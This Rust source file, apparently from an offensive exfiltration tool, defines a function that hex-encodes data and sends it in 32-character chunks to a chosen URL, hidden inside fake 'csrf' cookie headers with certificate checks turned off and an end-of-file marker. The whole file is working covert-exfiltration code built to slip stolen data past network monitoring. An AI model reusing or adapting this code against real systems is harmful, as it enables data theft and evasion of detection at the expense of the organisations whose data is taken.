use log::{info,debug,trace};
use rand::Rng;
use regex::Regex;
//use std::time::Duration;

use crate::utils::banner::progress_bar;
use indicatif::ProgressBar;
use std::convert::TryInto;

/// Function to extract data from HTTPS protocol
pub fn https_exfiltrator(
    data: Vec<u8>,
    url: &String,
){
   info!("Starting exfiltration from HTTPS..");

   // Encode Vec<u8> crypted to hexa string
   let hexa = hex::encode(data);
   trace!("Hexa data: {:?}",&hexa);
   let re = Regex::new(r"[\w-]{32}").unwrap();
   let caps = re.captures_iter(&hexa);
   let mut rng = rand::thread_rng();
   let rand: u16 = rng.gen();

   // Needed for progress bar stats
   let pb = ProgressBar::new(1);
   let mut count = 0;
   let total = re.captures_iter(&hexa).count();

   let client = reqwest::blocking::Client::builder()
      .danger_accept_invalid_certs(true)
      .build().unwrap();
   
   // Exfiltrate 32 chars by 32 chars
   for value in caps
   {
      let data = format!("csrf={}-{}",rand.to_string(),&value[0]);
      debug!("Sending to {} {}",&url,&data);
      let body = client.get(url)
        .header("Cookie", data)
        .send();
      trace!("Reponse {:?}", body);

      // Manage progress bar
      count += 1;
      let pourcentage = 100 * count / total;
      progress_bar(pb.to_owned(),"Exfiltrate data from HTTPS ".to_string(),pourcentage.try_into().unwrap(),"%".to_string());
   }
   // End of file
   let data = format!("csrf={}-crdeeofcrde",rand.to_string());
   debug!("Sending to {} {}",&url,&data);
   let body = client.get(url)
     .header("Cookie", data)
     .send();
   trace!("Reponse {:?}", body);

   // Remove progress bar
   pb.finish_and_clear();
   info!("Exfiltration from HTTPS finished!");
}